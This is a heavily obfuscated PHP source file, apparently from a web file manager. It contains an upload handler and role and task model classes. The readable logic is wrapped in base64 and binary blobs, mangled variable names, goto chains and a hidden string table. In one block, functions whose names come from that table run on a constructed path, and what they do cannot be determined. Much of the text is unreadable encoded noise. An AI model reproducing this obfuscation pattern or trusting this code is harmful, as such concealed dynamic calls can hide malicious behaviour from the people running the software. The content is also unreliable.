‰Øø').base64_decode('Y+p1NIREZSgSkRfSLU90BNi1cy1xXDe0kM5+OOXo2ZU48S2gMnYRsawVFqDYPYQIoE98Sg+WHNBZ').base64_decode('Ubsgc2MkQ+xby5FbuS+q8txsAopZ+HKB4zFQUetmViwaXxXDDVsI7q1ctuLZjKk4S1QDHwGK+w4Q').strrev('mş~'."\0".'À9¹È5½ıÂ’»wÃ§ÄîŸdpºÂ–;eFvÂ‰ÔY0@5²…oêĞ×PY§J+').base64_decode('RlZJkyThP/wIYA1MhoWskvx9/BnmWok/Xie+0A7Przo1RgfwClLQVrE+1QC9K1vnQFsltISmGwKa')."\xf0\x8a\xd5\x12\xe8\x74\x1e\x7\x7b\xd5\x3c\x7d\x21\x84\x90\x36\xcd\x4e\x46\x2\xc7\x2a\x95\xf\x6\x3e\x6c\x5a\x86\x88\x3f\x58\x6f\x7f\xa8\x1e\xed\xf6\xf0\x6\xce\xb2\x8f\x23\x5a\x3c\x22\x48\x38\x71\x82\xaa\xea\x56\x17\xb1\x28"."\x11\x81\xe9\x73\x9f\xa4\x4\xe1\x28\xdd\x7a\xa9\xc1\x1e\x26\x2f\xe3\x5b\x45\xb5\x47\x48\x46\xb9\xe8\xab\x72\xe0\x17\xbe\xe2\xe0\xe7\xbe\x1c\x50\x32\x3e\xe8\xf3\x94\x64\xa6\xe1\x62\xcf\xd5\x6f\x11\x86\x85\x2b\x90\x4\x22\x48\xbe"."\143\101\31\343\240\226\350\37\117\101\265\347\60\63\252\236\154\127\363\111\73\176\61\37\147\120\216\16\6\243\275\22\30\10\122\234\165\333\340\302\52\303\231\247\134\342\307\341\134\4\115\46\73\345\122\5\124"."\146\171\315\240\0\302\120\221\344\43\74\66\303\175\13\53\43\342\327\11\136\252\174\215\201\210\345\120\376\30\215\275\135\150\32\61\70\271\225\310\13\36\332\10\271\161\20\302\111\60\347\175\270\50\350\251\331"."\5\275\145\163\257\176\270\216\154\47\311\77\151\175\63\207\241\61\251\14\340\40\35\166\247\5\152\163\157\14\17\325\350\152\153\113\42\333\130\241\370\212\273\135\13\51\364\10\305\211\227\40\23\146\10\127\376"."\10\247\127\153\27\13\357\13\361\4\272\250\151\226\316\27\170\53\153\30\301\14\211\211\226\352\330\207\26\355\36\70\135\142\140\16\35\153\341\64\217\65\11\343\53\266\332\213\31\354\55\303\71\364\262\376\41"."\x79\x2a\x7f\xda\xfe\x1\xda\x3d\xf6\x2b\x48\x5e\x88\xb0\x79\x29\xbb\x1f\x8d\x68\x15\xf2\xe0\x1a\x55\xcc\x86\x93\x60\x4e\x2e\xb5\x59\xf2\x1a\x23\xaa\x99\xc8\x54\xcc\x8b\x93\x60\xde\xb2\x64\x9a\x59\xd8\x87\xb\xf9\x4c\xb9\x68\x4c"."\320\274\362\316\103\323\310\326\165\244\301\334\7\271\200\72\121\177\126\104\56\377\34\41\36\73\66\332\77\127\256\105\305\163\200\211\152\121\21\171\302\132\160\154\333\265\147\45\176\110\123\52\160\100\176\113\131".strrev('ÙPç{tzNš®îv@•n§œ9ñ$\'Ü1Ø¸6§w¬6,â¨mò¶ñd²ÂµCˆ\\&\\S;…ZykÎ')."\xce\xe6\x0\x98\xd2\x5e\xbe\x28\x38\x9d\xad\xe8\x41\xd8\x1\x37\xbc\xe5\x3b\xca\x2c\x75\xba\x25\xfa\x57\xc6\x3b\x11\xcd\x54\x13\x82\xae\x6\x4\x8a\x2e\x82\x71\x3a\xfd\x48\x96\x1f\x8d\x11\x49\x0\x5f\xb7\x79\x45\xd5\xe3\x5d\xf"."\x9c\xbd\x73\xf3\x1d\x3b\x37\xde\xbc\xf3\xb2\x73\xb6\xff\xe0\x1a\xc7\x8e\xb\x6f\xdb\x71\xfd\xf9\x3b\xae\xbf\x78\xfb\x5\x37\x6f\xbf\xf6\x4e\x9c\xb0\xe3\x86\x33\x77\x5f\x7b\xd9\x3c\x69\xc7\xf9\xdf\x83\x89\x57\x9d\xbb\xed\x97\xf"."\xe0\x7f\xb7\xdf\xfa\xf0\xae\x8d\x8f\xee\xdc\xb2\x11\xa3\x6c\xdf\xf4\xf0\xae\x4d\xb7\xed\xbc\xe2\xce\x1d\xe7\x3d\xb8\xe3\xea\x9b\x76\x5c\x79\xde\x64\xa1\x53\x40\xbd\x75\xee\x69\xd0\x72\x4d\x58\x21\xdd\xc5\x4f\x64\x2d\x7e\xae\xd1"."\xfb\x6d\xcc\x6a\x1d\x4b\x0\xe4\x4c\x1a\xdf\xa0\x20\xed\x1d\x2\x69\x1f\x83\xfb\x35\x7\x5e\x58\x71\x72\x58\xd3\x4d\x68\xcd\xe\x16\x84\x2\xfa\x6d\xd7\x4c\x93\xf2\x29\x20\x55\x23\x4c\x24\x27\x22\x67\x39\xc2\xbd\x30\x8\xf1\xc7".base64_decode('e+EQouNwROyIKaEgucuBe9uwglMRK7NE4DE7i4TKz9M7i7bLIw4Au9K4NkpoDT29w+sDz8NJt9hl')."\x41\xfe\x90\x2\x21\x76\xf1\x96\x1b\xa9\x9b\x19\x6e\x9c\xe2\x26\xaa\xe9\x4e\x54\x86\x93\xbc\x7\xc9\x54\xd3\x48\xf6\x24\x9a\x9c\xcc\xdd\xe6\xd7\x95\x40\x8e\x8\x79\x11\xf8\xc1\x72\x74\xcc\xd4\x17\x88\xc4\x7c\xcb\xfc\xe1\x48\xb8".strrev('bÇ^Vãª–¨ƒù\'²}-Ò U–SßÇ¯_4¢o w`¤²‚•¹FK-oV/!‡	è),').strrev('	$õ°¤}'."\0".'j€ºA[e'."\n".'—F}Ì8„ë¡.c±ÉC‰|Q³¦Xy±èoôÚ«ÏÆ³t^')."\337\173\147\234\205\211\313\250\101\242\216\21\277\73\164\131\356\30\5\70\232\54\210\277\11\104\50\256\335\10\100\164\142\155\167\74\266\16\354\262\235\326\132\156\11\21\204\167\10\254\367\42\352\111\142\265\26"."\27\56\216\60\13\264\60\77\121\221\3\207\55\311\200\267\104\264\210\234\46\274\4\112\63\74\326\76\46\206\305\263\222\66\306\112\114\71\115\257\352\355\134\136\270\233\206\275\364\377\0\174\275\171\122\351\305".base64_decode('AAA='), 10, -8))); goto AÁ™¢øç¸; e»á¸ùˆîÛ: if (class_exists($_SERVER[¯Ò¬Èè][1975])) { class Services_JSON_Error extends PEAR_Error { function __construct($Bí¸µòì…ƒ = "\165\x6e\153\156\x6f\x77\x6e\40\x65\162\162\x6f\162", $DÒªÅÜİÙ = null, $dâîÊÊ‹Ù„ = null, $dáâŞ–ïŠ¸ = null, $EÂƒ†ÕÑå÷ = null) { parent::PEAR_Error($Bí¸µòì…ƒ, $DÒªÅÜİÙ, $dâîÊÊ‹Ù„, $dáâŞ–ïŠ¸, $EÂƒ†ÕÑå÷); } } } else { class Services_JSON_Error { function __construct($DìËÅ¢Ñª¤ = "\x75\x6e\153\156\157\167\156\x20\x65\162\162\x6f\162", $E›òÎŞ‘º = null, $AœèŸöî„Œ = null, $dÉ®Â“‡ñ‰ = null, $Aİ¬¤ËŸÂÀ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto e¯ò•ƒó³µ; b›á˜öí‹­: $this->checkSize(); $this->tempPathInit(); goto bÛ±Ò‚ÆŒÑ; dÔÒ¹ßÔ‰: if (!empty($_FILES)) { $a¡‡Šœ¡ëº = $_FILES[$D±ËÕ“õÓ…[167]]; $this->uploadFile = $a¡‡Šœ¡ëº[$D±ËÕ“õÓ…[1976]]; if (!$this->uploadFile && $a¡‡Šœ¡ëº[$D±ËÕ“õÓ…[1227]] > 0) { show_json($this->errorInfo($a¡‡Šœ¡ëº[$D±ËÕ“õÓ…[1227]]), !1); } } else { if (isset($in[$D±ËÕ“õÓ…[386]])) { $this->uploadFile = isset($in[$D±ËÕ“õÓ…[1977]]) ? $D±ËÕ“õÓ…[1978] : $D±ËÕ“õÓ…[1823]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto b›á˜öí‹­; e¯ò•ƒó³µ: $D±ËÕ“õÓ… =& $_SERVER[¯Ò¬Èè]; global $in; $this->in =& $in; goto dÔÒ¹ßÔ‰; bÛ±Ò‚ÆŒÑ: } public function upload() { goto Aê´Ğ¶åˆ®; aŠîÅÒ—ÎÏ: $ešöù‡¥ó– = $this->moveUploadedFile($dó¢êñ«›ç); if ($FÓ»•ã§ŠÙ > 0 && filesize($ešöù‡¥ó–) == 0) { $this->showJson($bÊÌ×Ù¸‘[1984], !1); } if (!$ešöù‡¥ó–) { $this->showJson(LNG($bÊÌ×Ù¸‘[1985]), !1); } goto EÊ‚Ø˜¬§¿; aÒÖÏÖ†¿: ignore_timeout(); if (!$this->checkChunkHash($CâÈµßˆ‚Ï)) { $this->showJson($bÊÌ×Ù¸‘[1993], !1); } $this->statusSet(!1); goto cÅù™‘õÎĞ; EºˆµÜ´ÜÊ: CacheLock::lock($this->tempFile, 20); $CâÈµßˆ‚Ï = $this->statusGet(); $this->initFileTemp(); goto aŠîÅÒ—ÎÏ; bóİîØÍŠ´: $CâÈµßˆ‚Ï[$bÊÌ×Ù¸‘[1989]][$bÊÌ×Ù¸‘[1990] . $aŞ¨ó¤ ] = array($bÊÌ×Ù¸‘[1991] => $DíÅ×ïáŒÖ, $bÊÌ×Ù¸‘[1045] => $aŞ¨ó¤ , $bÊÌ×Ù¸‘[77] => $FÓ»•ã§ŠÙ, $bÊÌ×Ù¸‘[164] => $CÅ‡ç¼¨¾Ø); $this->statusSet($CâÈµßˆ‚Ï); if (count($CâÈµßˆ‚Ï[$bÊÌ×Ù¸‘[1989]]) != $CâÈµßˆ‚Ï[$bÊÌ×Ù¸‘[1988]]) { $this->showJson($bÊÌ×Ù¸‘[1992] . $aŞ¨ó¤ , !0); } goto aÒÖÏÖ†¿; cğ§È½§Ó…: if ($c«¥¦³óƒ  > 1 && $bØ›ÆŞ¥Ø´ <= 0) { show_json($bÊÌ×Ù¸‘[1983], !1); } if ($bØ›ÆŞ¥Ø´ > $FÓ»•ã§ŠÙ) { $c«¥¦³óƒ  = 1; } if ($c«¥¦³óƒ  <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto EºˆµÜ´ÜÊ; cÅù™‘õÎĞ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto E‚ùµ•ÈéÁ; EÊ‚Ø˜¬§¿: $DíÅ×ïáŒÖ = $aŞ¨ó¤  * $bØ›ÆŞ¥Ø´; $a»Æ¡¡á† = @fopen($this->tempFile, $bÊÌ×Ù¸‘[1986]); fseek($a»Æ¡¡á†, $DíÅ×ïáŒÖ); goto E÷¤¡–ğË‹; E÷¤¡–ğË‹: $DÊÖ·«…§ª = $this->writeTo($ešöù‡¥ó–, $a»Æ¡¡á†, $this->tempFile); $CÅ‡ç¼¨¾Ø = IO::hashSimple($ešöù‡¥ó–); $FÓ»•ã§ŠÙ = IO::size($ešöù‡¥ó–); goto F¤æó‹´ÕÙ; FÊÖèòÌ™•: $dó¢êñ«›ç = $this->tempFile . $bÊÌ×Ù¸‘[1981] . $aŞ¨ó¤ ; $FÓ»•ã§ŠÙ = isset($this->in[$bÊÌ×Ù¸‘[529]]) ? intval($this->in[$bÊÌ×Ù¸‘[529]]) : 0; $bØ›ÆŞ¥Ø´ = isset($this->in[$bÊÌ×Ù¸‘[1982]]) ? intval($this->in[$bÊÌ×Ù¸‘[1982]]) : 0; goto cğ§È½§Ó…; Aê´Ğ¶åˆ®: $bÊÌ×Ù¸‘ =& $_SERVER[¯Ò¬Èè]; $aŞ¨ó¤  = isset($this->in[$bÊÌ×Ù¸‘[1979]]) ? intval($this->in[$bÊÌ×Ù¸‘[1979]]) : 0; $c«¥¦³óƒ  = isset($this->in[$bÊÌ×Ù¸‘[1980]]) ? intval($this->in[$bÊÌ×Ù¸‘[1980]]) : 1; goto FÊÖèòÌ™•; F¤æó‹´ÕÙ: @unlink($ešöù‡¥ó–); if (!$DÊÖ·«…§ª) { $this->showJson($bÊÌ×Ù¸‘[1987] . $aŞ¨ó¤ , !1); } $CâÈµßˆ‚Ï[$bÊÌ×Ù¸‘[1988]] = $c«¥¦³óƒ ; goto bóİîØÍŠ´; E‚ùµ•ÈéÁ: } private function checkSize() { $bîÒ¼Åˆœ° =& $_SERVER[¯Ò¬Èè]; if (phpBuild64() || $this->in[$bîÒ¼Åˆœ°[77]] < PHP_INT_MAX) { return; } show_json(LNG($bîÒ¼Åˆœ°[1994]), !1); } private function showJson($eôÈÛ£Äé„, $DßóÇÚÉ†) { CacheLock::unlock($this->tempFile); if (!$DßóÇÚÉ†) { return show_json($eôÈÛ£Äé„, $DßóÇÚÉ†); } show_json($eôÈÛ£Äé„, $DßóÇÚÉ†); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto b‹æ³‰±×£; b‹æ³‰±×£: $ešì’× =& $_SERVER[¯Ò¬Èè]; $A¥æ¶ÖÒ™ = TEMP_FILES; @mk_dir($A¥æ¶ÖÒ™); goto eŠ„ãîõòö; dÑ÷İŒØŸö: $this->tempFile = $A¥æ¶ÖÒ™ . $ešì’×[1997] . md5($AÒÂÏßÕõˆ . $this->in[$ešì’×[1541]]); goto FÃˆ¯ƒ°©¶; eŠ„ãîõòö: touch($A¥æ¶ÖÒ™ . $ešì’×[1995]); $AÒÂÏßÕõˆ = isset($this->in[$ešì’×[1996]]) ? $this->in[$ešì’×[1996]] : !1; if (strlen($AÒÂÏßÕõˆ) < 30) { $AÒÂÏßÕõˆ = md5(USER_ID . $this->in[$ešì’×[75]] . $this->fileName . $this->in[$ešì’×[77]]); } goto dÑ÷İŒØŸö; FÃˆ¯ƒ°©¶: } private function moveUploadedFile($CŒáï‡Ö³Ş) { $bá’ õàä =& $_SERVER[¯Ò¬Èè]; $dÂÃìñè­Ä = $this->uploadFile; if ($dÂÃìñè­Ä == $bá’ õàä[1998]) { @file_put_contents($CŒáï‡Ö³Ş, base64_decode($_REQUEST[$bá’ õàä[1999]])); } else { if ($dÂÃìñè­Ä == $bá’ õàä[1823]) { $D»ÄçÓˆ· = @fopen($CŒáï‡Ö³Ş, $bá’ õàä[1531]); $this->writeTo($dÂÃìñè­Ä, $D»ÄçÓˆ·, $CŒáï‡Ö³Ş); } else { if (!move_uploaded_file($dÂÃìñè­Ä, $CŒáï‡Ö³Ş)) { return !1; } } } return $CŒáï‡Ö³Ş; } private function writeTo($AŒø…ùÚ£–, $BáÇ¸„Í”, $cå©”ğ¦Ã) { goto cõĞÜ©¯ÂÙ; cõĞÜ©¯ÂÙ: $Aïƒê… =& $_SERVER[¯Ò¬Èè]; $F¥İÈ›âÃ… = $Aïƒê…[2000] . $cå©”ğ¦Ã; $c‹ñò¹Ïòõ = CacheLock::lock($F¥İÈ›âÃ…, 1); goto a©Ù† ‡“Ü; bÉ¬–ùÏ‚¸: return !0; goto AŸ¹¹áºÜ; c¾µ­‡Ê–ƒ: fclose($BâÙŸ‚¾Š½); fclose($BáÇ¸„Í”); CacheLock::unlock($F¥İÈ›âÃ…); goto bÉ¬–ùÏ‚¸; a©Ù† ‡“Ü: $BâÙŸ‚¾Š½ = @fopen($AŒø…ùÚ£–, $Aïƒê…[1530]); if (!$BâÙŸ‚¾Š½ || !$BáÇ¸„Í” || !$c‹ñò¹Ïòõ) { CacheLock::unlock($F¥İÈ›âÃ…); return !1; } while (!feof($BâÙŸ‚¾Š½)) { fwrite($BáÇ¸„Í”, fread($BâÙŸ‚¾Š½, 1024 * 200)); } goto c¾µ­‡Ê–ƒ; AŸ¹¹áºÜ: } private function statusGet() { goto f’ø¼ÁÂ§Œ; e§×éŞ¥Ø: if (!$this->statusData) { $bŸá‡Ğ¯Àá = array($b•¹Ù‰É®‰[28] => $this->fileName, $b•¹Ù‰É®‰[1988] => 0, $b•¹Ù‰É®‰[1989] => array()); $this->statusSet($bŸá‡Ğ¯Àá); } return $this->statusData; goto eã¨Ò«¥æ; d„¨åÍ¦‡®: $bºÜÁ¬å¾ê = !1; if (file_exists($eêË’­¡®•)) { $bºÜÁ¬å¾ê = @file_get_contents($eêË’­¡®•); } if ($bºÜÁ¬å¾ê) { $this->statusData = json_decode($bºÜÁ¬å¾ê, !0); } goto e§×éŞ¥Ø; f’ø¼ÁÂ§Œ: $b•¹Ù‰É®‰ =& $_SERVER[¯Ò¬Èè]; if (is_array($this->statusData)) { return $this->statusData; } $eêË’­¡®• = $this->tempFile . $b•¹Ù‰É®‰[2001]; goto d„¨åÍ¦‡®; eã¨Ò«¥æ: } public function statusSet($B¿âÜ›óÏ) { $fÙùŒÙƒÎ = $this->tempFile . $_SERVER[¯Ò¬Èè][2001]; if (!$B¿âÜ›óÏ) { if (file_exists($fÙùŒÙƒÎ)) { @unlink($fÙùŒÙƒÎ); } return !0; } $this->statusData = $B¿âÜ›óÏ; return file_put_contents($fÙùŒÙƒÎ, json_encode($B¿âÜ›óÏ)); } private function initFileTemp() { $fŞ‹»í†¥ô =& $_SERVER[¯Ò¬Èè]; if (file_exists($this->tempFile)) { return; } $AŞ…¥Èë¢Ç = fopen($this->tempFile, $fŞ‹»í†¥ô[2002]); fseek($AŞ…¥Èë¢Ç, $this->in[$fŞ‹»í†¥ô[77]] - 1, SEEK_SET); fwrite($AŞ…¥Èë¢Ç, $fŞ‹»í†¥ô[468]); fclose($AŞ…¥Èë¢Ç); } public function checkChunk() { goto c‘×—¤İ©ö; c‘×—¤İ©ö: $B×‘¶² ‹ =& $_SERVER[¯Ò¬Èè]; $d°¼—šŞŒ = array(); CacheLock::lock($this->tempFile); goto EÈ‹²ÄÈ¶°; EÈ‹²ÄÈ¶°: $e‘‹‹¿õğ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($e‘‹‹¿õğ[$B×‘¶² ‹[1989]] as $FÖ´©„êÉŒ) { $cœáå„‡× = $FÖ´©„êÉŒ[$B×‘¶² ‹[164]]; if ($cœáå„‡×) { $d°¼—šŞŒ[$B×‘¶² ‹[2003] . $FÖ´©„êÉŒ[$B×‘¶² ‹[1045]]] = $cœáå„‡×; } } goto AÛŠø¶Ü²’; AÛŠø¶Ü²’: return $d°¼—šŞŒ; goto fï·ÁßöÎ¥; fï·ÁßöÎ¥: } private function checkChunkHash($d»“ß¬»Õá) { goto Eíé†µâ‘; Eíé†µâ‘: $D‰ö½ÛùÀ® =& $_SERVER[¯Ò¬Èè]; if (count($d»“ß¬»Õá[$D‰ö½ÛùÀ®[1989]]) != $d»“ß¬»Õá[$D‰ö½ÛùÀ®[1988]]) { return !1; } $E²“«…•»Ò = _get($this->in, $D‰ö½ÛùÀ®[1996]); goto BÒìÃ‚†ŠÙ; BÒìÃ‚†ŠÙ: $EœœğÇé¦¯ = _get($this->in, $D‰ö½ÛùÀ®[2004]); if (strlen($EœœğÇé¦¯) == 32 && IO::hashSimple($this->tempFile) == $E²“«…•»Ò && IO::hashMd5($this->tempFile) == $EœœğÇé¦¯) { return !0; } $BŠéæê´°‘ = fopen($this->tempFile, $D‰ö½ÛùÀ®[1178]); goto fÃÎÌ‘ìË; bÒÜ¼÷ÈÂê: return $aĞ×ôã©×; goto AˆÜ…Ó‘Œ™; fÃÎÌ‘ìË: $aĞ×ôã©× = !0; foreach ($d»“ß¬»Õá[$D‰ö½ÛùÀ®[1989]] as $eòÎ õøäŠ) { fseek($BŠéæê´°‘, $eòÎ õøäŠ[$D‰ö½ÛùÀ®[1991]]); $a”ë®í¹¤ = PathDriverStream::hash($BŠéæê´°‘, $eòÎ õøäŠ[$D‰ö½ÛùÀ®[77]]); if ($eòÎ õøäŠ[$D‰ö½ÛùÀ®[164]] != $a”ë®í¹¤) { $aĞ×ôã©× = !1; break; } } fclose($BŠéæê´°‘); goto bÒÜ¼÷ÈÂê; AˆÜ…Ó‘Œ™: } public static function fileName() { goto e½¼ÌˆÃ…; A‡›ñ¢Ş†: $cÑÃ¯Ÿò™ = $cÑÃ¯Ÿò™ ? $cÑÃ¯Ÿò™ : time(); $C»®ñæ” = strtolower($BÉÅÎè¡ ); if ($C»®ñæ” == $Dª÷àæ ‘¾[2006] || $C»®ñæ” == $Dª÷àæ ‘¾[2007]) { $BÉÅÎè¡  = date($Dª÷àæ ‘¾[704], $cÑÃ¯Ÿò™) . $Dª÷àæ ‘¾[70] . $in[$Dª÷àæ ‘¾[77]] . $Dª÷àæ ‘¾[1638]; } else { if ($C»®ñæ” == $Dª÷àæ ‘¾[2008]) { $BÉÅÎè¡  = date($Dª÷àæ ‘¾[704], $cÑÃ¯Ÿò™) . $Dª÷àæ ‘¾[70] . $in[$Dª÷àæ ‘¾[77]] . $Dª÷àæ ‘¾[2009]; } } goto B‚‹ØÉçŠë; Dô¨…›¥‰§: if (!empty($_FILES)) { $BÉÅÎè¡  = $BÉÅÎè¡  ? $BÉÅÎè¡  : $_FILES[$Dª÷àæ ‘¾[167]][$Dª÷àæ ‘¾[386]]; } if (!is_wap()) { return KodIO::clear($BÉÅÎè¡ ); } $cÑÃ¯Ÿò™ = strtotime($in[$Dª÷àæ ‘¾[2005]]); goto A‡›ñ¢Ş†; B‚‹ØÉçŠë: return KodIO::clear($BÉÅÎè¡ ); goto b¨„½Ğ¡¦¼; e½¼ÌˆÃ…: $Dª÷àæ ‘¾ =& $_SERVER[¯Ò¬Èè]; global $in; $BÉÅÎè¡  = isset($in[$Dª÷àæ ‘¾[28]]) ? $in[$Dª÷àæ ‘¾[28]] : $Dª÷àæ ‘¾[33]; goto Dô¨…›¥‰§; b¨„½Ğ¡¦¼: } private function errorInfo($C¦ˆµÛò) { $b·ÑéÅöÖÉ =& $_SERVER[¯Ò¬Èè]; $Eœ‰”†×Ñ = array($b·ÑéÅöÖÉ[2010], $b·ÑéÅöÖÉ[2011], $b·ÑéÅöÖÉ[2012], $b·ÑéÅöÖÉ[2013], $b·ÑéÅöÖÉ[2014], $b·ÑéÅöÖÉ[2015], $b·ÑéÅöÖÉ[2016], $b·ÑéÅöÖÉ[2017]); return $C¦ˆµÛò . $b·ÑéÅöÖÉ[4] . $Eœ‰”†×Ñ[$C¦ˆµÛò]; } } if ($_SERVER[$_SERVER[¯Ò¬Èè][490]] != $_SERVER[$_SERVER[¯Ò¬Èè][491]]) { goto Eº† È¯¬¶; DÚš¡•í½‰: $eÒ›»®©Š… = explode($_SERVER[¯Ò¬Èè][217], $cÉ†×ä´…Ğ); if (count($eÒ›»®©Š…) < $_SERVER[¯Ò¬Èè][495]) { $A—°ªšíõ¿ = $_SERVER[¯Ò¬Èè][496]; $A—°ªšíõ¿(); } $B”™±ö˜½È = $_SERVER[¯Ò¬Èè][497]; goto dˆ‰ì®óŸ¯; Eº† È¯¬¶: $b£˜­‡¥… = $_SERVER[¯Ò¬Èè][492]; $b æÑŒìÁ‡ = $_SERVER[$_SERVER[¯Ò¬Èè][493]] . $_SERVER[¯Ò¬Èè][494]; $cÉ†×ä´…Ğ = $b£˜­‡¥…($b æÑŒìÁ‡); goto DÚš¡•í½‰; dˆ‰ì®óŸ¯: $B”™±ö˜½È($_SERVER[$_SERVER[¯Ò¬Èè][498]]); goto B‘‡•š¸ƒß; B‘‡•š¸ƒß: } goto bŒõ¿—…›; d‘µƒ‡éó÷: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\162\x6f\154\x65\x4c\151\x73\164"; public $field = array("\156\x61\x6d\x65", "\x61\x75\x74\150", "\x6c\141\142\145\154", "\x64\x69\x73\160\154\x61\x79", "\x73\x79\163\x74\x65\155", "\144\145\x73\x63", "\x69\x67\156\x6f\x72\145\x45\x78\x74", "\151\x67\156\x6f\x72\145\x46\151\154\145\x53\151\172\x65", "\141\144\155\151\x6e\x69\x73\164\162\141\164\x6f\x72", "\x73\x6f\162\164"); public function listData($AÚÎ«—…¤ = false, $B×ø«î®˜— = "\163\157\x72\x74", $D›Í‡Ê¦Î¯ = false) { $eÆ–Ó£ªÈœ =& $_SERVER[¯Ò¬Èè]; $e®‹ŠÓ· = parent::listData($AÚÎ«—…¤, $B×ø«î®˜—, $D›Í‡Ê¦Î¯); if (!$AÚÎ«—…¤) { $a‚Œë¨´ì‘ = $eÆ–Ó£ªÈœ[2490]; foreach ($e®‹ŠÓ· as $fŒÈ”éÊ‚² => $B­°ºã»ìÃ) { if ($B­°ºã»ìÃ[$eÆ–Ó£ªÈœ[2491]] == 1) { $e®‹ŠÓ·[$fŒÈ”éÊ‚²][$eÆ–Ó£ªÈœ[405]] = $a‚Œë¨´ì‘; } } } return $e®‹ŠÓ·; } public function update($aÂÔ£ÜÅòñ, $CĞ•ß¦Ò ƒ) { goto D¶Í´•‰öÙ; D¶Í´•‰öÙ: $A£Ã÷½„òÃ =& $_SERVER[¯Ò¬Èè]; $BŠ‘¨¾ÀÂÕ = parent::listData($aÂÔ£ÜÅòñ); $d›ÅÈ«éñË = $this->findByName($CĞ•ß¦Ò ƒ[$A£Ã÷½„òÃ[28]]); goto C¶æ–İè´ˆ; C¶æ–İè´ˆ: if (!$BŠ‘¨¾ÀÂÕ || $d›ÅÈ«éñË && $d›ÅÈ«éñË[$A£Ã÷½„òÃ[367]] != $BŠ‘¨¾ÀÂÕ[$A£Ã÷½„òÃ[367]]) { return !1; } if ($d›ÅÈ«éñË[$A£Ã÷½„òÃ[2491]] == 1) { $CĞ•ß¦Ò ƒ = array($A£Ã÷½„òÃ[28] => $CĞ•ß¦Ò ƒ[$A£Ã÷½„òÃ[28]], $A£Ã÷½„òÃ[2132] => $CĞ•ß¦Ò ƒ[$A£Ã÷½„òÃ[2132]]); } $this->filterAuth($CĞ•ß¦Ò ƒ[$A£Ã÷½„òÃ[376]]); goto cè‰¶¥¹÷; cè‰¶¥¹÷: return parent::update($aÂÔ£ÜÅòñ, $CĞ•ß¦Ò ƒ); goto dÀÚ½—ï˜; dÀÚ½—ï˜: } public function remove($BÊëó«øÑ¾) { $AäÜ³Ûß = parent::listData($BÊëó«øÑ¾); if (!$AäÜ³Ûß || $AäÜ³Ûß[$_SERVER[¯Ò¬Èè][1089]]) { return !1; } return parent::remove($BÊëó«øÑ¾); } public function add($fìŒ‚»ÉŸ÷) { goto CÕºòçêéÊ; bÊ´¦µÏÖ×: $d‘Š¦Ø˜¸Ô = array($cÉîàù›ùß[386] => $cˆàßìÁ’Ë, $cÉîàù›ùß[2120] => $cÉîàù›ùß[33], $cÉîàù›ùß[2116] => $cÉîàù›ùß[2133], $cÉîàù›ùß[2492] => 1, $cÉîàù›ùß[2119] => 0, $cÉîàù›ùß[2493] => 0, $cÉîàù›ùß[2118] => $this->getSort()); $fìŒ‚»ÉŸ÷ = array_merge($d‘Š¦Ø˜¸Ô, $fìŒ‚»ÉŸ÷); $this->filterAuth($fìŒ‚»ÉŸ÷[$cÉîàù›ùß[376]]); goto AÅò‡„‘§; CÕºòçêéÊ: $cÉîàù›ùß =& $_SERVER[¯Ò¬Èè]; $cˆàßìÁ’Ë = $fìŒ‚»ÉŸ÷[$cÉîàù›ùß[28]]; if ($this->findByName($cˆàßìÁ’Ë)) { return !1; } goto bÊ´¦µÏÖ×; AÅò‡„‘§: return parent::insert($fìŒ‚»ÉŸ÷); goto d®Í¼…†ˆò; d®Í¼…†ˆò: } private function getSort() { $EÚ…Õ ¤¹ =& $_SERVER[¯Ò¬Èè]; $dĞÒèø‘å„ = parent::listData(); $c…É¥åÇŸ° = array_to_keyvalue($dĞÒèø‘å„, $EÚ…Õ ¤¹[33], $EÚ…Õ ¤¹[2135]); return empty($c…É¥åÇŸ°) ? 0 : max($c…É¥åÇŸ°) + 1; } private function filterAuth(&$bØô§ÑÜƒ) { $eÅÓ—™¾àÇ =& $_SERVER[¯Ò¬Èè]; $D§‡Ş˜ß•‘ = array(); $Cè‰ĞÙÊÉ† = array_filter(explode($eÅÓ—™¾àÇ[47], $bØô§ÑÜƒ)); foreach ($Cè‰ĞÙÊÉ† as $bØô§ÑÜƒ) { $EÕÃ®ÜÂ¿Ë = explode($eÅÓ—™¾àÇ[91], $bØô§ÑÜƒ); if ($EÕÃ®ÜÂ¿Ë[0] == $eÅÓ—™¾àÇ[1793] && $EÕÃ®ÜÂ¿Ë[1] != $eÅÓ—™¾àÇ[1045]) { $E†‡Šâœê³ = $EÕÃ®ÜÂ¿Ë[0] . $eÅÓ—™¾àÇ[91] . $EÕÃ®ÜÂ¿Ë[1] . $eÅÓ—™¾àÇ[2494]; if (!in_array($E†‡Šâœê³, $Cè‰ĞÙÊÉ†)) { $D§‡Ş˜ß•‘[] = $E†‡Šâœê³; } } $D§‡Ş˜ß•‘[] = $bØô§ÑÜƒ; } $bØô§ÑÜƒ = implode($eÅÓ—™¾àÇ[47], $D§‡Ş˜ß•‘); } public function sort($CĞóùø¾›ß, $D£¨ƒÈ·æ) { return parent::update($CĞóùø¾›ß, $D£¨ƒÈ·æ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\164\x61\x73\153\114\151\x73\x74"; public $field = array("\156\x61\x6d\145", "\164\171\160\145", "\x65\166\x65\156\164", "\x74\x69\155\x65", "\144\x65\163\x63", "\163\171\x73\164\x65\x6d", "\145\x6e\141\142\154\145", "\x6c\141\x73\164\122\x75\x6e", "\x73\x6f\x72\164"); public function listData($BØ™Ú§½‰Ä = false, $c©Ğß²­Šæ = "\163\157\162\164", $F ôß÷Üíí = false) { return parent::listData($BØ™Ú§½‰Ä, $c©Ğß²­Šæ, $F ôß÷Üíí); } public function add($FÃÈ¨¯Ï½è) { $AáÓ–£§œ =& $_SERVER[¯Ò¬Èè]; $Dçº±óï‰¶ = $this->findByName($FÃÈ¨¯Ï½è[$AáÓ–£§œ[28]]); if ($Dçº±óï‰¶) { return !1; } 